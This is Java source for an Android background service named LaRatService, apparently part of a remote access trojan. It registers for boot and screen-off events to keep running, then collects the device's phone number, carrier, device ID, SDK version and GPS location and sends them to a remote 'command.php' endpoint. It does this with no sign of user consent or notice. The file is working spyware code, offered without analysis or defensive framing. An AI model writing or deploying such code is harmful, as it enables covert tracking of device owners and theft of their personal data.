package com.c4wd.larat;

import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Binder;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;

import com.loopj.android.http.RequestParams;
import com.parse.Parse;
import com.parse.ParseInstallation;


import java.io.File;

/**
 * Created by cory on 10/4/15.
 */
public class LaRatService extends android.app.Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    BroadcastReceiver LaRatBroadcastReceiver;
    private final IBinder LaRatBinder = new LocalBinder();

    public class LocalBinder extends Binder {
        LaRatService getService() {
            return LaRatService.this;
        }
    }

    @Override
    public void onCreate() {
        IntentFilter bootFilter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        bootFilter.addAction(Intent.ACTION_SCREEN_OFF);
        LaRatBroadcastReceiver = new LaRatServiceReceiver();
        registerReceiver(LaRatBroadcastReceiver, bootFilter);
        Parse.initialize(this, com.c4wd.larat.ParseConstants.APP_ID, ParseConstants.CLIENT_KEY);
        try {
            ParseInstallation.getCurrentInstallation().save();
        } catch (com.parse.ParseException e) {
            e.printStackTrace();
        }
        super.onCreate();
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        if (!Constants.IS_SETUP) {
            Constants.setupInternals(getApplicationContext());
        }

        Constants.updateLocation(getApplicationContext());

        Log.i("com.c4wrd", "Start MyService");
        if (PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("ClientID", "") == null || PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "").equals("")) {
            PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putString("ClientID", Constants.CLIENT_ID).commit();
        }

        RequestParams params = new RequestParams();
        params.put("command", "userUpdate");
        params.put("clientId", Constants.CLIENT_ID);
        params.put("carrier", Constants.PROVIDER);
        params.put("phoneNumber", Constants.PHONE_NUMBER);
        params.put("deviceid", Constants.DEVICE_ID);
        params.put("sdkversion", Constants.SDK_VERSION);
        if(Constants.LAST_LOCATION != null) {
            params.put("latitude", Constants.LAST_LOCATION.getLatitude());
            params.put("longitude", Constants.LAST_LOCATION.getLongitude());
        } else {
            params.put("latitude", 0.0);
            params.put("longitude", 0.0);
        }
        RestClient.get("command.php", params, new RestClient.DefaultJsonHandler());
    }
}
